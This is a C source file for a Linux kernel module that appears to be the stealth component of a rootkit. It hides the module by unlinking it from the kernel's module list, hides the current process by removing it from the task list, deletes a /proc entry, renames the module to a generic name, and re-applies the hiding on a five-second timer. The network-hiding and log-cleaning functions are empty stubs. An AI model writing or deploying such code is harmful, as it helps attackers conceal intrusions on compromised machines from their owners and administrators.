#include "stealth.h"
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/timer.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <net/tcp.h>

static struct list_head *prev_module = NULL;
static bool module_hidden = false;

static struct list_head *prev_process = NULL;
static struct pid *hidden_pid = NULL;

static bool net_hidden = false;

static struct timer_list stealth_timer;

void hide_module(void)
{
    if (!module_hidden) {
        struct module *mod = THIS_MODULE;
        
        if (mod->list.prev != NULL) {
            prev_module = mod->list.prev;
            list_del(&mod->list);
            module_hidden = true;
        } else {
        }
    }
}

void show_module(void)
{
    if (module_hidden && prev_module) {
        struct module *mod = THIS_MODULE;
        list_add(&mod->list, prev_module);
        module_hidden = false;
        prev_module = NULL;
    }
}

void hide_current_process(void)
{
    struct task_struct *task = current;
    
    if (!hidden_pid) {
        hidden_pid = get_task_pid(task, PIDTYPE_PID);
        
        write_lock_irq(&tasklist_lock);
        
        if (!list_empty(&task->tasks)) {
            prev_process = task->tasks.prev;
            list_del(&task->tasks);
        } else {
        }
        
        write_unlock_irq(&tasklist_lock);
    }
}

void show_current_process(void)
{
    struct task_struct *task = current;
    
    if (hidden_pid && prev_process) {
        write_lock_irq(&tasklist_lock);
        list_add(&task->tasks, prev_process);
        write_unlock_irq(&tasklist_lock);
        
        put_pid(hidden_pid);
        hidden_pid = NULL;
        prev_process = NULL;
        }
}

void hide_proc_entry(void) {
remove_proc_entry("狂狮", NULL);
}

void show_proc_entry(void) {
}

void hide_network_connections(void) {
    if (!net_hidden) {
        net_hidden = true;
    }
}

void show_network_connections(void) {
    if (net_hidden) {
        net_hidden = false;
    }
}

void clean_kernel_logs(void) {
}

void spoof_module_signature(void) {
    struct module *mod = THIS_MODULE;
    
    strncpy(mod->name, "kernel_module", sizeof(mod->name)-1);
}

void stealth_timer_callback(struct timer_list *t) {
    if (module_hidden) {
        hide_module();
    }
    if (hidden_pid) {
        hide_current_process();
        hide_proc_entry();
    }
    
    mod_timer(&stealth_timer, jiffies + msecs_to_jiffies(5000));
}

void setup_stealth_timer(void) {
    timer_setup(&stealth_timer, stealth_timer_callback, 0);
    mod_timer(&stealth_timer, jiffies + msecs_to_jiffies(5000));
}

void cleanup_stealth_timer(void) {
    del_timer_sync(&stealth_timer);
}

void enable_stealth_mode(struct miscdevice *misc)
{    
    hide_module();
    hide_current_process();
    hide_proc_entry();
    hide_network_connections();
    spoof_module_signature();
    clean_kernel_logs();
    }

void disable_stealth_mode(void)
{    
    show_module();
    show_current_process();
    show_proc_entry();
    show_network_connections();
    }